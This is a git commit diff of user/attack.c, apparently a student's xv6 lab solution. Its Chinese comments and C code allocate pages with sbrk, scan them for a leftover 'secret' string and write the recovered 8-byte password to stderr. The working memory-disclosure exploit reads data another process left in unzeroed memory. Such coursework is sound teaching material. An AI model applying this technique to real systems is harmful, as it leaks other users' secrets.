4b2fc6aaf553840a6728c060b70d4f27cbfc47bb
hanzhen <zhouhanzhen2023@gmail.com>
2025-04-21 12:32:19 +0800

    attack complete

--- user/attack.c
+++ user/attack.c
@@ -9,5 +9,58 @@ main(int argc, char *argv[])
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
 
-  exit(1);
+  // 出现的问题：内存页的前8个字节是存储页链表指针的地方，这里是无法存储其他内容的，所以当读取end的内容时读取不到内容
+  // 无法匹配"my very very very secret pw is:"，需要从end+8处读取字符，才能找到secret
+
+  // 遍历分配的内存页，通过"my very very very secret pw is:"对应找到secret所在内存页的地址end
+  // secret的地址则为end + 32
+  // 将secret保存至字符数组中
+  // 将secret写入fd 2
+  
+  int flag = 0;
+  char secret[8];
+  
+  //char line[32];
+  //line[31] = '\0';
+
+  char match[7] = "secret";
+  char word[7];
+  word[6] = '\0';
+
+  char *end = sbrk(PGSIZE*32);
+  char *limit = end + PGSIZE*31;
+  for(int i = 0; i < 31; i++) {
+    // printf("%d ", i);
+    memcpy(word, end+18, 6);
+    // printf("%s\n", word);
+
+    // memcpy(line, end+8, 23);
+    // printf("%s\n", line);
+    if(strcmp(word, match) == 0) {
+      flag = 1;
+      break;
+    }
+    end += PGSIZE;
+  }
+
+  if(end == limit) {
+    memcpy(word, end+18, 6);
+    // printf("%s\n", line);
+
+    // memcpy(line, end+13, 11);
+    // printf("%s\n", line);
+
+    if(strcmp(word, match) == 0) {
+      flag = 1;
+    }
+  }
+  
+  if(flag == 1){
+    memcpy(secret, end + 32, 8);
+    write(2, secret, 8);
+  }else{
+    printf("cannot find secret\n");
+  }
+  
+  exit(0);
 }
